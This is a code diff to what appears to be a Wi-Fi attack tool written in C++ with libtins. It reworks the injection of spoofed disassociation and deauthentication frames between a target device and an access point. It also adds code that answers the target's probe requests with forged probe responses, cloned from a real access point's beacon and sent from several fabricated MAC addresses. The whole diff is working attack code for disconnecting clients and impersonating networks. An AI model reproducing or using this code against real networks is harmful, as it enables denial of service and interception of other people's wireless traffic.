@@ -44,14 +44,19 @@ void injectPacket(PDU *pdu, bool drop_fcs, pcap_t *handle)
 }
 
 template <typename Packet>
-RadioTap constructManagementFrameWithReasonCode(HWAddress<6> target_mac, HWAddress<6> source_mac, int channel, int reason_code)
+RadioTap constructManagementFrameWithReasonCode(
+	HWAddress<6> target_mac,
+	HWAddress<6> source_mac,
+	HWAddress<6> bssid,
+	int channel,
+	int reason_code)
 {
 	Packet mgnt;
 	mgnt.reason_code(reason_code);
 
-	mgnt.addr1(target_mac);	  // set device mac address
-	mgnt.addr2(source_mac);	  // set ap mac address
-	mgnt.addr3(mgnt.addr2()); // set bssid (optional)
+	mgnt.addr1(target_mac); // set device mac address
+	mgnt.addr2(source_mac); // set ap mac address
+	mgnt.addr3(bssid);		// set bssid (optional)
 
 	RadioTap radio = RadioTap() / mgnt; // make 802.11 packet
 
@@ -147,6 +152,7 @@ public:
 							auto radio = constructManagementFrameWithReasonCode<Dot11Disassoc>(
 								config.target_mac,
 								ap.bssid,
+								ap.bssid,
 								channel,
 								7 // INVALID_CLASS3_FRAME
 							);
@@ -155,19 +161,21 @@ public:
 						}
 
 						{
-                            auto radio = constructManagementFrameWithReasonCode<Dot11Disassoc>(
+							auto radio = constructManagementFrameWithReasonCode<Dot11Disassoc>(
 								ap.bssid,
-                                config.target_mac,
-                                channel,
-                                7 // INVALID_CLASS3_FRAME
-                            );
+								config.target_mac,
+								ap.bssid,
+								channel,
+								7 // INVALID_CLASS3_FRAME
+							);
 
-                            injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
-                        }
+							injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
+						}
 
 						{
 							auto radio = constructManagementFrameWithReasonCode<Dot11Deauthentication>(
 								config.target_mac,
+								ap.bssid,
 								ap.bssid,
 								channel,
 								6 // INVALID_CLASS2_FRAME
@@ -177,15 +185,16 @@ public:
 						}
 
 						{
-                            auto radio = constructManagementFrameWithReasonCode<Dot11Deauthentication>(
+							auto radio = constructManagementFrameWithReasonCode<Dot11Deauthentication>(
 								ap.bssid,
-                                config.target_mac,
-                                channel,
-                                6 // INVALID_CLASS2_FRAME
-                            );
+								config.target_mac,
+								ap.bssid,
+								channel,
+								6 // INVALID_CLASS2_FRAME
+							);
 
-                            injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
-                        }
+							injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
+						}
 
 						/*
 
@@ -235,6 +244,47 @@ public:
 					auto channel = ieee80211_frequency_to_channel((signed)tap->channel_freq());
 					auto essid = beacon->ssid();
 					apm.update(bssid, essid, channel, signal_dbm);
+					apm.addBeacon(beacon);
+				}
+
+				if (Dot11ProbeRequest *request = pdu.find_pdu<Dot11ProbeRequest>())
+				{
+					if (request->addr2() == config.target_mac)
+					{
+						auto tap = pdu.find_pdu<RadioTap>();
+						auto channel = ieee80211_frequency_to_channel((signed)tap->channel_freq());
+
+						auto ssid = request->ssid();
+
+						auto ap = apm.getApByESSID(ssid, channel <= 14 ? 2 : 5);
+
+						if (ap.beacon)
+						{
+							auto &beacon = *(ap.beacon);
+							auto addr = beacon.addr2();
+
+							for (int i = 0; i < 4; i++)
+							{
+								addr[5] = addr[5] * 61 + 19;
+
+								Dot11ProbeResponse response;
+
+								response.addr1(config.target_mac);
+								response.addr2(addr);
+								response.addr3(response.addr2());
+
+								for (auto option : beacon.options())
+								{
+									response.add_option(option);
+								}
+
+								RadioTap radio = RadioTap() / response;
+								radio.tx_flags(IEEE80211_RADIOTAP_F_TX_NOACK);
+
+								injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
+							}
+						}
+					}
 				}
 
 				if (Dot11ProbeResponse *response = pdu.find_pdu<Dot11ProbeResponse>())
